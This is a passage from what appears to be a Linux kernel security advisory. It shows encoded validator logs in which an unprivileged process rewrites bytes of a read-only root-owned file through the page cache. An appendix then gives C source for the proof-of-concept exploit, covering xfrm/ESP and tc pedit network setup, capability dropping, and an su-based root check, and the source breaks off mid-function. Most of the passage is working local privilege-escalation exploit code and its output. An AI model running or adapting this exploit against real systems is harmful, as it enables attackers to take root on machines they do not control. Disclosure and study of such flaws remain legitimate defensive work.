NFT_QUEUE_SETUP table=3Dskbaudit chain=3Doutq hook=3DLOCAL_OUT queue=3D0 =
acks=3D3
NFQUEUE_BIND queue=3D0 copy_mode=3DNFQNL_COPY_PACKET copy_range=3D65535 f=
lags=3DGSO|UID_GID
PROBE sent=3D522 nfq_msglen=3D618 packet_id=3D1
PROBE frag_start=3D96
PROBE layout nlmsghdr16+nfgenmsg4+attrs+PAYLOADnla4+linear_copy28 frag=3D=
[96,104) vector=3D[104,618)
PROBE_ORIGINAL_UDP_RECEIVED len=3D522
LAYOUT msg_len=3D618 ip_tot_len=3D604 ct_len=3D544 ct_blocks=3D34 icv_at=
=3D602
FRAME length=3D96 pedit_keys=3D24
PEDIT_FRAME (96 bytes):
  0000: 00 00 00 00 00 00 00 00 00 00 00 00 08 00 45 00
  0010: 02 5c 23 45 00 00 40 32 57 29 7f 00 00 01 7f 00
  0020: 00 01 00 00 01 00 00 00 00 01 55 5e 19 80 ff 6e
  0030: f9 ca a8 a9 aa ab ac ad ae af 80 81 82 83 84 85
  0040: 86 87 88 89 8a 8b 8c 8d 8e 8f 90 91 92 93 94 95
  0050: 5b 4c 12 6b af 67 cd b3 9e 9f a0 a1 a2 a3 a4 a5
CRYPTO self_check=3DPASS aes=3Dcbc(aes)-128 auth=3Dhmac(sha256)-trunc128 =
spi=3D0x100 seq=3D1
ESP_SELFTEST injected=3D618 inner_udp_received=3Dyes xfrm_before=3D[] xfr=
m_after=3D[]
TC_NETLINK_SETUP device=3Dnlmon0 hook=3Degress classifier=3Du32 pedit_key=
s=3D24 redirect=3Dlo status=3DPASS
CAPS CapInh=3D0 CapPrm=3D0 CapEff=3D0 CapBnd=3D0 CapAmb=3D0 NoNewPrivs=3D=
1
TRIGGER sent=3D522 target_spliced=3D8 vector_spliced=3D514
TRIGGER nfq_msglen=3D618 packet_id=3D2
TRIGGER_MSG_ESP_REGION (584 bytes):
  0000: 06 00 00 00 00 01 08 00 10 00 00 00 03 e8 08 00
  0010: 11 00 00 00 03 e8 08 00 0e 00 00 00 00 01 2a 02
  0020: 0a 00 45 00 02 26 6c 11 40 00 40 11 ce b3 7f 00
  0030: 00 01 7f 00 00 01 c4 30 15 b3 02 12 00 26 5a 46
  0040: 52 47 2d 4f 4b 21 33 78 4f 29 be 01 fe 83 72 6a
  0050: c9 37 76 b8 2f e8 1e 3c 41 e8 b6 b4 e2 c6 51 eb
  0060: 07 32 2c 6c 96 a3 f9 59 6f c3 14 f1 05 42 7b 9c
  0070: c7 fe 3d c8 d7 b7 94 2a d4 bc 33 b7 07 a9 8a da
  0080: a5 f1 c7 a9 33 1c 61 10 bb dd 4a f5 02 7f d2 f1
  0090: e6 93 e8 1a 42 d9 1e 3c 41 e8 b6 b4 e2 c6 51 eb
  00a0: 07 32 2c 6c 96 a3 f9 59 6f c3 14 f1 05 42 7b 9c
  00b0: c7 fe 3d c8 d7 b7 94 2a d4 bc 33 b7 07 a9 8a da
  00c0: a5 f1 c7 a9 33 1c 61 10 bb dd 4a f5 02 7f d2 f1
  00d0: e6 93 e8 1a 42 d9 1e 3c 41 e8 b6 b4 e2 c6 51 eb
  00e0: 07 32 2c 6c 96 a3 f9 59 6f c3 14 f1 05 42 7b 9c
  00f0: c7 fe 3d c8 d7 b7 94 2a d4 bc 33 b7 07 a9 8a da
  0100: a5 f1 c7 a9 33 1c 61 10 bb dd 4a f5 02 7f d2 f1
  0110: e6 93 e8 1a 42 d9 1e 3c 41 e8 b6 b4 e2 c6 51 eb
  0120: 07 32 2c 6c 96 a3 f9 59 6f c3 14 f1 05 42 7b 9c
  0130: c7 fe 3d c8 d7 b7 94 2a d4 bc 33 b7 07 a9 8a da
  0140: a5 f1 c7 a9 33 1c 61 10 bb dd 4a f5 02 7f d2 f1
  0150: e6 93 e8 1a 42 d9 1e 3c 41 e8 b6 b4 e2 c6 51 eb
  0160: 07 32 2c 6c 96 a3 f9 59 6f c3 14 f1 05 42 7b 9c
  0170: c7 fe 3d c8 d7 b7 94 2a d4 bc 33 b7 07 a9 8a da
  0180: a5 f1 c7 a9 33 1c 61 10 bb dd 4a f5 02 7f d2 f1
  0190: e6 93 e8 1a 42 d9 1e 3c 41 e8 b6 b4 e2 c6 51 eb
  01a0: 07 32 2c 6c 96 a3 f9 59 6f c3 14 f1 05 42 7b 9c
  01b0: c7 fe 3d c8 d7 b7 94 2a d4 bc 33 b7 07 a9 8a da
  01c0: a5 f1 c7 a9 33 1c 61 10 bb dd 4a f5 02 7f d2 f1
  01d0: e6 93 e8 1a 42 d9 1e 3c 41 e8 b6 b4 e2 c6 51 eb
  01e0: 07 32 2c 6c 96 a3 f9 59 6f c3 14 f1 05 42 7b 9c
  01f0: c7 fe 3d c8 d7 b7 94 2a d4 bc 33 b7 07 a9 8a da
  0200: a5 f1 c7 a9 33 1c 61 10 bb dd 4a f5 02 7f d2 f1
  0210: e6 93 e8 1a 42 d9 1e 3c f1 53 e0 ce 11 fd c8 93
  0220: 44 70 77 e4 7e 1b 8b 80 6f c3 14 f1 05 42 7b 9c
  0230: c7 fe 3d c8 d7 b7 06 11 bd 03 c2 de c5 a3 50 ac
  0240: a7 9a 18 57 d4 5e 3f f7
INNER_UDP_RECEIVED len=3D528 (decrypted in place, delivered on lo)
DIAG /proc/net/xfrm_stat XfrmInError             =090/XfrmInBufferError  =
     =090/XfrmInHdrError          =090/XfrmInNoStates          =090/XfrmI=
nStateProtoError   =090/XfrmInStateModeError    =090/XfrmInStateSeqError =
    =090/XfrmInStateExpired      =090/XfrmInStateMismatch     =090/XfrmIn=
StateInvalid      =090/XfrmInTmplMismatch      =090/XfrmInNoPols         =
   =090/XfrmInPolBlock          =090/XfrmInPolError          =090/XfrmOut=
Error            =090/XfrmOutBundleGenError   =090/XfrmOutBundleCheckErro=
r =090/XfrmOutNoStates         =090/XfrmOutStateProtoError  =090/XfrmOutS=
tateModeError   =090/XfrmOutStateSeqError    =090/XfrmOutStateExpired    =
 =090/XfrmOutPolBlock         =090/XfrmOutPolDead          =090/XfrmOutPo=
lError         =090/XfrmFwdHdrError         =090/XfrmOutStateInvalid     =
=090/XfrmAcquireError        =090/XfrmOutStateDirError    =090/XfrmInStat=
eDirError     =090/XfrmInIptfsError        =090/XfrmOutNoQueueSpace     =
=090/
DIAG /sys/class/net/nlmon0/statistics/rx_packets errno=3D2
DIAG /sys/class/net/nlmon0/statistics/tx_packets errno=3D2
DIAG /sys/class/net/lo/statistics/rx_packets 101/
DIAG /sys/class/net/lo/statistics/tx_packets 101/
TARGET_WINDOW_AFTER (40 bytes):
  0000: 46 c1 ba d6 f9 d4 b8 71 00 c1 a0 82 cf a2 31 7a
  0010: 5a 46 52 47 2d 4f 4b 21 a2 d5 38 f8 21 69 b6 37
  0020: 5a b0 bd c6 32 9d 7e 9d
TRIGGER changed=3D1 guards_ok=3D1 target_exact=3D1 caps=3Dzero no_new_pri=
vs=3D1
TARGET_SHA256_AFTER=3D7aaed173fe012e8870c209625be04ac9230cee3bff2f97582e0=
88edf0e85ee5a
MMAP_VIEW target_bytes=3D5a4652472d4f4b21 mmap_matches_desired=3D1
EVICTION fadvise=3DDONTNEED window_recovered_to_original=3D0 (target byte=
s back to 5a465247)
TARGET_SHA256_AFTER_EVICT=3D7aaed173fe012e8870c209625be04ac9230cee3bff2f9=
7582e088edf0e85ee5a
RESULT ZEROFRAG_REPRODUCED=3D1
validator exit code: 0

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
=3D=3D 6. final target state on the guest
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+ ssh -i /root/image/trixie.id_rsa -p 10021 -o StrictHostKeyChecking=3Dno=
 -o UserKnownHostsFile=3D/dev/null -o ConnectTimeout=3D10 root@127.0.0.1 =
ls -la /var/tmp/zf-scratch-8k.bin; sha256sum /var/tmp/zf-scratch-8k.bin; =
od -An -tx1 -j 4160 -N8 /var/tmp/zf-scratch-8k.bin
Warning: Permanently added '[127.0.0.1]:10021' (ED25519) to the list of k=
nown hosts.
-r--r--r--. 1 root root 8192 Sep 10 19:19 /var/tmp/zf-scratch-8k.bin
7aaed173fe012e8870c209625be04ac9230cee3bff2f97582e088edf0e85ee5a  /var/tm=
p/zf-scratch-8k.bin
 5a 46 52 47 2d 4f 4b 21
```


## Appendix: PoC core source 

This appendix allows static review of the complete trigger path directly =
in the advisory.

### runtime.c

~~~c
// SPDX-License-Identifier: GPL-2.0
/* Behavior-faithful reconstruction of runtime.c, ELF 0x402e20..0x406afb.=
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <linux/capability.h>
#include <openssl/sha.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/fsuid.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/statfs.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <termios.h>
#include <unistd.h>

#include "launcher.h"
#include "profile.h"
#include "unified.h"

#ifndef F_ADD_SEALS
#define F_ADD_SEALS 1033
#define F_GET_SEALS 1034
#define F_SEAL_SEAL 0x0001
#define F_SEAL_SHRINK 0x0002
#define F_SEAL_GROW 0x0004
#define F_SEAL_WRITE 0x0008
#endif
#ifndef MFD_ALLOW_SEALING
#define MFD_ALLOW_SEALING 0x0002U
#endif
#ifndef PR_CAP_AMBIENT
#define PR_CAP_AMBIENT 47
#define PR_CAP_AMBIENT_CLEAR_ALL 4
#endif

#define EXT4_SUPER_MAGIC 0xef53UL
#define XFS_SUPER_MAGIC 0x58465342UL
#define BTRFS_SUPER_MAGIC 0x9123683eUL

struct capability_snapshot {
    uint64_t inheritable;
    uint64_t permitted;
    uint64_t effective;
    uint64_t ambient;
};

static const struct profile *selected;
static const char *launcher_request;
static const struct launcher_backend *selected_launcher;
static struct capability_snapshot public_caps_before;
static bool public_caps_before_valid;

static int read_all_fd(int fd, unsigned char **out, size_t *out_length)
{
    struct stat st;
    unsigned char *buffer;
    size_t length =3D 0, capacity;

    if (fstat(fd, &st) < 0 || st.st_size < 0)
        return -1;
    capacity =3D st.st_size ? (size_t)st.st_size + 1 : 8192;
    buffer =3D malloc(capacity);
    if (!buffer)
        return -1;
    if (lseek(fd, 0, SEEK_SET) < 0 && errno !=3D ESPIPE) {
        free(buffer);
        return -1;
    }
    for (;;) {
        ssize_t n;
        if (length + 1 =3D=3D capacity) {
            unsigned char *grown;
            capacity *=3D 2;
            grown =3D realloc(buffer, capacity);
            if (!grown) {
                free(buffer);
                return -1;
            }
            buffer =3D grown;
        }
        n =3D read(fd, buffer + length, capacity - length - 1);
        if (n < 0) {
            free(buffer);
            return -1;
        }
        if (n =3D=3D 0)
            break;
        length +=3D (size_t)n;
    }
    buffer[length] =3D 0;
    *out =3D buffer;
    *out_length =3D length;
    return 0;
}

static int capture(char *const argv[], char *out, size_t out_size,
                   char *err, size_t err_size, unsigned int timeout_secon=
ds)
{
    int out_pipe[2], err_pipe[2], status =3D 0;
    pid_t pid;
    size_t out_length =3D 0, err_length =3D 0;
    unsigned int tick;

    if (!out_size || !err_size || pipe2(out_pipe, O_CLOEXEC) < 0 ||
        pipe2(err_pipe, O_CLOEXEC) < 0)
        return -1;
    fflush(NULL);
    pid =3D fork();
    if (pid < 0)
        return -1;
    if (pid =3D=3D 0) {
        int nullfd =3D open("/dev/null", O_RDONLY);
        dup2(nullfd, STDIN_FILENO);
        dup2(out_pipe[1], STDOUT_FILENO);
        dup2(err_pipe[1], STDERR_FILENO);
        close(out_pipe[0]); close(out_pipe[1]);
        close(err_pipe[0]); close(err_pipe[1]);
        execv(argv[0], argv);
        _Exit(127);
    }
    close(out_pipe[1]);
    close(err_pipe[1]);
    for (tick =3D 0;; tick++) {
        pid_t got =3D waitpid(pid, &status, WNOHANG);
        if (got =3D=3D pid || got < 0)
            break;
        if (tick =3D=3D timeout_seconds * 20) {
            kill(pid, SIGKILL);
            waitpid(pid, &status, 0);
            status =3D 124 << 8;
            break;
        }
        usleep(50000);
    }
    while (out_length + 1 < out_size) {
        ssize_t n =3D read(out_pipe[0], out + out_length, out_size - out_=
length - 1);
        if (n <=3D 0)
            break;
        out_length +=3D (size_t)n;
    }
    while (err_length + 1 < err_size) {
        ssize_t n =3D read(err_pipe[0], err + err_length, err_size - err_=
length - 1);
        if (n <=3D 0)
            break;
        err_length +=3D (size_t)n;
    }
    out[out_length] =3D 0;
    err[err_length] =3D 0;
    close(out_pipe[0]);
    close(err_pipe[0]);
    if (WIFEXITED(status))
        return WEXITSTATUS(status);
    return WIFSIGNALED(status) ? 128 + WTERMSIG(status) : -1;
}

static int capture_pty(char *const argv[], char out[1024], char err[1024]=
)
{
    char slave_name[128], buffer[4096] =3D {0};
    int master, status =3D 0, flags;
    pid_t pid;
    size_t used =3D 0, clean =3D 0;
    unsigned int tick;
    bool answered =3D false;

    err[0] =3D 0;
    master =3D posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
    if (master < 0 || grantpt(master) < 0 || unlockpt(master) < 0 ||
        ptsname_r(master, slave_name, sizeof(slave_name)) !=3D 0)
        goto fail;
    pid =3D fork();
    if (pid < 0)
        goto fail;
    if (pid =3D=3D 0) {
        int slave;
        if (setsid() < 0 || (slave =3D open(slave_name, O_RDWR)) < 0 ||
            ioctl(slave, TIOCSCTTY, 0) < 0 || dup2(slave, 0) < 0 ||
            dup2(slave, 1) < 0 || dup2(slave, 2) < 0)
            _Exit(126);
        if (slave > 2)
            close(slave);
        close(master);
        execv(argv[0], argv);
        _Exit(127);
    }
    flags =3D fcntl(master, F_GETFL, 0);
    if (flags >=3D 0)
        fcntl(master, F_SETFL, flags | O_NONBLOCK);
    for (tick =3D 0; tick <=3D 100; tick++) {
        ssize_t n =3D read(master, buffer + used, sizeof(buffer) - used -=
 1);
        if (n > 0) {
            used +=3D (size_t)n;
            buffer[used] =3D 0;
        }
        if (!answered && strstr(buffer, "Password:")) {
            answered =3D write(master, "\n\n\n", 3) =3D=3D 3;
        }
        if (waitpid(pid, &status, WNOHANG) =3D=3D pid)
            break;
        usleep(50000);
    }
    if (tick > 100) {
        kill(pid, SIGKILL);
        waitpid(pid, &status, 0);
        status =3D 124 << 8;
    }
    while (used + 1 < sizeof(buffer)) {
        ssize_t n =3D read(master, buffer + used, sizeof(buffer) - used -=
 1);
        if (n <=3D 0)
            break;
        used +=3D (size_t)n;
    }
    close(master);
    for (size_t i =3D 0; i < used && clean < 1023; i++)
        if (buffer[i] !=3D '\r')
            out[clean++] =3D buffer[i];
    out[clean] =3D 0;
    return WIFEXITED(status) ? WEXITSTATUS(status) : 128 + WTERMSIG(statu=
s);
fail:
    if (master >=3D 0)
        close(master);
    out[0] =3D 0;
    return -1;
}

static int read_capabilities(struct capability_snapshot *caps)
{
    static const char *names[] =3D { "CapInh:", "CapPrm:", "CapEff:", "Ca=
pAmb:" };
    uint64_t *values =3D (uint64_t *)caps;
    unsigned char *data;
    size_t length, i;
    int fd =3D open("/proc/self/status", O_RDONLY | O_CLOEXEC);

    memset(caps, 0, sizeof(*caps));
    if (fd < 0 || read_all_fd(fd, &data, &length) < 0) {
        if (fd >=3D 0) close(fd);
        return -1;
    }
    close(fd);
    for (i =3D 0; i < 4; i++) {
        char *line =3D strstr((char *)data, names[i]);
        if (!line || sscanf(line + strlen(names[i]), "%16llx",
                            (unsigned long long *)&values[i]) !=3D 1) {
            free(data);
            return -1;
        }
    }
    free(data);
    return 0;
}

static bool zero_caps(void)
{
    struct capability_snapshot caps;
    return read_capabilities(&caps) =3D=3D 0 && !caps.inheritable && !cap=
s.permitted &&
           !caps.effective && !caps.ambient;
}

static int normalize_public_capabilities(void)
{
    struct __user_cap_header_struct header =3D {
        .version =3D _LINUX_CAPABILITY_VERSION_3, .pid =3D 0,
    };
    struct __user_cap_data_struct data[2] =3D {{0}};
    struct capability_snapshot after;

    if (read_capabilities(&public_caps_before) < 0) {
        printf("CAPABILITY_NORMALIZATION=3DFAIL stage=3Dread_before errno=
=3D%d\n", errno);
        return -1;
    }
    public_caps_before_valid =3D true;
    printf("CALLER_CAPS_BEFORE inheritable=3D%016llx permitted=3D%016llx =
effective=3D%016llx ambient=3D%016llx\n",
           (unsigned long long)public_caps_before.inheritable,
           (unsigned long long)public_caps_before.permitted,
           (unsigned long long)public_caps_before.effective,
           (unsigned long long)public_caps_before.ambient);
    if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_CLEAR_ALL, 0, 0, 0) < 0) {
        printf("CAPABILITY_NORMALIZATION=3DFAIL stage=3Dclear_ambient err=
no=3D%d\n", errno);
        return -1;
    }
    if (syscall(SYS_capset, &header, data) < 0) {
        printf("CAPABILITY_NORMALIZATION=3DFAIL stage=3Dcapset errno=3D%d=
\n", errno);
        return -1;
    }
    if (read_capabilities(&after) < 0) {
        printf("CAPABILITY_NORMALIZATION=3DFAIL stage=3Dread_after errno=
=3D%d\n", errno);
        return -1;
    }
    printf("CALLER_CAPS_AFTER inheritable=3D%016llx permitted=3D%016llx e=
ffective=3D%016llx ambient=3D%016llx\n",
           (unsigned long long)after.inheritable, (unsigned long long)aft=
er.permitted,
           (unsigned long long)after.effective, (unsigned long long)after=
.ambient);
    if (after.inheritable || after.permitted || after.effective || after.=
ambient) {
        puts("CAPABILITY_NORMALIZATION=3DFAIL stage=3Dverify_zero errno=
=3D0");
        return -1;
    }
    printf("CAPABILITY_NORMALIZATION=3DPASS changed=3D%d\n",
           memcmp(&public_caps_before, &after, sizeof(after)) !=3D 0);
    return 0;
}

static bool file_contains(const char *path, const char *needle)
{
    unsigned char *data;
    size_t length;
    bool found;
    int fd =3D open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0 || read_all_fd(fd, &data, &length) < 0) {
        if (fd >=3D 0) close(fd);
        return false;
    }
    close(fd);
    found =3D strstr((char *)data, needle) !=3D NULL;
    free(data);
    return found;
}

static bool csv_has(const char *csv, const char *value)
{
    size_t length;
    if (!csv || !value)
        return false;
    length =3D strlen(value);
    while (*csv) {
        const char *comma =3D strchr(csv, ',');
        size_t item_length =3D comma ? (size_t)(comma - csv) : strlen(csv=
);
        if (item_length =3D=3D length && memcmp(csv, value, length) =3D=
=3D 0)
            return true;
        if (!comma)
            break;
        csv =3D comma + 1;
    }
    return false;
}

static int hash_path(const char *path, char hex[65])
{
    unsigned char *data, digest[SHA256_DIGEST_LENGTH];
    size_t length, i;
    int fd =3D open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0 || read_all_fd(fd, &data, &length) < 0) {
        if (fd >=3D 0) close(fd);
        return -1;
    }
    close(fd);
    SHA256(data, length, digest);
    free(data);
    for (i =3D 0; i < sizeof(digest); i++)
        sprintf(hex + i * 2, "%02x", digest[i]);
    hex[64] =3D 0;
    return 0;
}

static bool supplementary_groups_allowed(gid_t primary, const char *allow=
ed)
{
    gid_t *groups;
    int count =3D getgroups(0, NULL), i;
    char text[32];
    if (count < 0)
        return false;
    if (count =3D=3D 0)
        return true;
    groups =3D calloc((size_t)count, sizeof(*groups));
    if (!groups || getgroups(count, groups) !=3D count) {
        free(groups);
        return false;
    }
    for (i =3D 0; i < count; i++) {
        if (groups[i] =3D=3D primary)
            continue;
        snprintf(text, sizeof(text), "%u", groups[i]);
        if (!allowed || !csv_has(allowed, text)) {
            free(groups);
            return false;
        }
    }
    free(groups);
    return true;
}

static bool os_release_equals(const char *key, const char *expected)
{
    char line[512];
    FILE *stream =3D fopen("/etc/os-release", "r");
    if (!stream)
        return false;
    while (fgets(line, sizeof(line), stream)) {
        char *equals =3D strchr(line, '=3D');
        if (equals && (size_t)(equals - line) =3D=3D strlen(key) &&
            memcmp(line, key, strlen(key)) =3D=3D 0) {
            char *value =3D equals + 1;
            value[strcspn(value, "\r\n")] =3D 0;
            if (*value =3D=3D '"' && value[1]) {
                size_t n =3D strlen(value);
                if (n > 1 && value[n - 1] =3D=3D '"') {
                    value[n - 1] =3D 0;
                    value++;
                }
            }
            fclose(stream);
            return strcmp(value, expected) =3D=3D 0;
        }
    }
    fclose(stream);
    return false;
}

static const char *executable(const char *first, const char *second)
{
    if (access(first, X_OK) =3D=3D 0)
        return first;
    return access(second, X_OK) =3D=3D 0 ? second : NULL;
}

static int command(char *const argv[])
{
    char out[4096], err[4096];
    int rc =3D capture(argv, out, sizeof(out), err, sizeof(err), 8);
    if (rc !=3D 0)
        fprintf(stderr, "COMMAND_FAIL path=3D%s status=3D%d stdout=3D%s s=
tderr=3D%s\n",
                argv[0], rc, out, err);
    return rc;
}

static int write_one(const char *path)
{
    int fd =3D open(path, O_WRONLY | O_CLOEXEC);
    int ok =3D fd >=3D 0 && write(fd, "1\n", 2) =3D=3D 2;
    if (fd >=3D 0) close(fd);
    return ok ? 0 : -1;
}

static int network_setup(void)
{
    const char *ip =3D executable("/usr/sbin/ip", "/sbin/ip");
    const char *tc =3D executable("/usr/sbin/tc", "/sbin/tc");
    char *link_lo[] =3D { (char *)ip, "link", "set", "lo", "up", NULL };
    char *add_nlmon[] =3D { (char *)ip, "link", "add", "nlmon0", "type", =
"nlmon", NULL };
    char *up_nlmon[] =3D { (char *)ip, "link", "set", "nlmon0", "up", NUL=
L };
    char *state[] =3D { (char *)ip, "xfrm", "state", "add", "src", "127.0=
.0.1",
        "dst", "127.0.0.1", "proto", "esp", "spi", "0x100", "mode", "tran=
sport",
        "replay-window", "0", "auth-trunc", "hmac(sha256)",
        "0x404142434445464748494a4b4c4d4e4f505152535455565758595a5b5c5d5e=
5f",
        "128", "enc", "cbc(aes)", "0x000102030405060708090a0b0c0d0e0f", N=
ULL };
    char *policy[] =3D { (char *)ip, "xfrm", "policy", "add", "dir", "in"=
,
        "src", "127.0.0.1/32", "dst", "127.0.0.1/32", "tmpl", "src", "127=
.0.0.1",
        "dst", "127.0.0.1", "proto", "esp", "spi", "0x100", "mode", "tran=
sport", NULL };

    if (!ip || command(link_lo) || command(add_nlmon) || command(up_nlmon=
) ||
        command(state) || command(policy))
        return -1;
    if (!strcmp(selected->tc_mode, "embedded_u32"))
        return selected->tc_frame_length =3D=3D 88
            ? tc_netlink_setup_88(selected->tc_frame, 88)
            : tc_netlink_setup_96(selected->tc_frame, 96);
    if (!tc)
        return -1;
    {
        char *qdisc[] =3D { (char *)tc, "qdisc", "add", "dev", "nlmon0", =
"clsact", NULL };
        char offsets[24][8], values[24][16];
        char *argv[13 + 24 * 6 + 8 + 1];
        size_t i, n =3D 0, keys =3D selected->tc_frame_length / 4;

        if (command(qdisc))
            return -1;
        argv[n++] =3D (char *)tc; argv[n++] =3D "filter"; argv[n++] =3D "=
add";
        argv[n++] =3D "dev"; argv[n++] =3D "nlmon0"; argv[n++] =3D "egres=
s";
        argv[n++] =3D "protocol"; argv[n++] =3D "all"; argv[n++] =3D "pre=
f";
        argv[n++] =3D "1"; argv[n++] =3D "matchall"; argv[n++] =3D "actio=
n";
        argv[n++] =3D "pedit";
        for (i =3D 0; i < keys; i++) {
            uint32_t word;
            memcpy(&word, selected->tc_frame + i * 4, 4);
            snprintf(offsets[i], sizeof(offsets[i]), "%zu", i * 4);
            snprintf(values[i], sizeof(values[i]), "0x%08x", ntohl(word))=
;
            argv[n++] =3D "munge"; argv[n++] =3D "offset"; argv[n++] =3D =
offsets[i];
            argv[n++] =3D "u32"; argv[n++] =3D "set"; argv[n++] =3D value=
s[i];
        }
        argv[n++] =3D "pipe"; argv[n++] =3D "action"; argv[n++] =3D "mirr=
ed";
        argv[n++] =3D "egress"; argv[n++] =3D "redirect"; argv[n++] =3D "=
dev";
        argv[n++] =3D "lo"; argv[n] =3D NULL;
        {
            int rc =3D command(argv);
            if (rc =3D=3D 0)
                printf("TC_EXTERNAL_SETUP device=3Dnlmon0 hook=3Degress "
                       "classifier=3Dmatchall pedit_keys=3D%zu redirect=
=3Dlo status=3DPASS\n",
                       keys);
            return rc;
        }
    }
}

static int inherited_profile(void)
{
    uint32_t index;
    struct stat target_fd, target_path, vector;
    uint8_t bytes[40], slice[8];
    int seals =3D fcntl(PROFILE_FD, F_GET_SEALS);

    if (seals < 0 || (seals & 0xf) !=3D 0xf ||
        pread(PROFILE_FD, &index, sizeof(index), 0) !=3D sizeof(index) ||
        index >=3D compiled_profile_count)
        return -1;
    selected =3D &compiled_profiles[index];
    if (fstat(TARGET_FD, &target_fd) < 0 || stat(selected->target_path, &=
target_path) < 0 ||
        target_fd.st_dev !=3D target_path.st_dev || target_fd.st_ino !=3D=
 target_path.st_ino ||
        (fcntl(TARGET_FD, F_GETFL) & O_ACCMODE) !=3D O_RDONLY ||
        fstat(VECTOR_FD, &vector) < 0 || vector.st_size !=3D VECTOR_BYTES=
 ||
        pread(TARGET_FD, bytes, sizeof(bytes), (off_t)selected->target_of=
fset - 16) !=3D sizeof(bytes) ||
        pread(TARGET_FD, slice, sizeof(slice), (off_t)selected->target_of=
fset) !=3D sizeof(slice) ||
        memcmp(slice, selected->original_slice, sizeof(slice)) !=3D 0)
        return -1;
    return 0;
}

static int install_fds(const struct profile *profile)
{
    uint32_t index =3D (uint32_t)(profile - compiled_profiles);
    int profile_fd =3D -1, self_fd =3D -1, target_fd =3D -1, vector_fd =
=3D -1;
    int seals =3D F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRIT=
E;

    profile_fd =3D memfd_create("unified-profile", MFD_ALLOW_SEALING);
    target_fd =3D open(profile->target_path, O_RDONLY | O_CLOEXEC);
    vector_fd =3D memfd_create("unified-vector", MFD_ALLOW_SEALING);
    self_fd =3D open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
    if (profile_fd < 0 || target_fd < 0 || vector_fd < 0 || self_fd < 0 |=
|
        write(profile_fd, &index, sizeof(index)) !=3D sizeof(index) ||
        write(vector_fd, profile->mutation_vector, VECTOR_BYTES) !=3D VEC=
TOR_BYTES ||
        fcntl(profile_fd, F_ADD_SEALS, seals) < 0 ||
        fcntl(vector_fd, F_ADD_SEALS, seals) < 0 ||
        dup2(profile_fd, PROFILE_FD) < 0 || dup2(self_fd, SELF_FD) < 0 ||
        dup2(target_fd, TARGET_FD) < 0 || dup2(vector_fd, VECTOR_FD) < 0)
        goto fail;
    for (int fd =3D PROFILE_FD; fd <=3D VECTOR_FD; fd++)
        fcntl(fd, F_SETFD, 0);
    close(profile_fd); close(self_fd); close(target_fd); close(vector_fd)=
;
    return 0;
fail:
    if (profile_fd >=3D 0) close(profile_fd);
    if (self_fd >=3D 0) close(self_fd);
    if (target_fd >=3D 0) close(target_fd);
    if (vector_fd >=3D 0) close(vector_fd);
    return -1;
}

static int self_path(char path[4096])
{
    ssize_t n =3D readlink("/proc/self/exe", path, 4095);
    if (n <=3D 0)
        return -1;
    path[n] =3D 0;
    return 0;
}

static int consumer(const struct profile *profile, char out[1024], char e=
rr[1024])
{
    const char *su =3D executable("/usr/bin/su", "/bin/su");
    if (!su)
        return -1;
    if (!strcmp(profile->consumer_mode, "pty_su")) {
        char *argv[] =3D { (char *)su, "-s", "/bin/sh", "root", "-c", "/u=
sr/bin/id -u", NULL };
        return capture_pty(argv, out, err);
    }
    {
        char *argv[] =3D { (char *)su, "--shell", "/usr/bin/id", "--", "r=
oot", "-u", NULL };
        return capture(argv, out, 1024, err, 1024, 5);
    }
}

static int drop_all_caps(void)
{
    struct __user_cap_header_struct header =3D {
        .version =3D _LINUX_CAPABILITY_VERSION_3, .pid =3D 0,
    };
    struct __user_cap_data_struct data[2] =3D {{0}};
    for (int cap =3D 0; cap < 64; cap++)
        if (prctl(PR_CAPBSET_DROP, cap, 0, 0, 0) < 0 && errno !=3D EINVAL=
)
            return -1;
    if (syscall(SYS_capset, &header, data) < 0 ||
        prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0)
        return -1;
    return zero_caps() ? 0 : -1;
}

static int mutate_stage(void)
{
    struct sockaddr_in address =3D { .sin_family =3D AF_INET, .sin_port =
=3D htons(5555) };
    uint8_t before[40], after[40];
    off_t target_offset, vector_offset =3D 0;
    int receiver =3D -1, sender =3D -1, pipefd[2], status;
    pid_t child;

    if (drop_all_caps() < 0 ||
        pread(TARGET_FD, before, sizeof(before), (off_t)selected->target_=
offset - 16) !=3D sizeof(before) ||
        inet_pton(AF_INET, "127.0.0.1", &address.sin_addr) !=3D 1)
        return 1;
    receiver =3D socket(AF_INET, SOCK_DGRAM, 0);
    sender =3D socket(AF_INET, SOCK_DGRAM, 0);
    if (receiver < 0 || sender < 0 || bind(receiver, (struct sockaddr *)&=
address, sizeof(address)) < 0 ||
        connect(sender, (struct sockaddr *)&address, sizeof(address)) < 0=
 || pipe(pipefd) < 0)
        return 1;
    child =3D fork();
    if (child < 0)
        return 1;
    if (child =3D=3D 0) {
        uint8_t packet[640];
        alarm(5);
        _Exit(recv(receiver, packet, sizeof(packet), 0) < 0);
    }
    close(receiver);
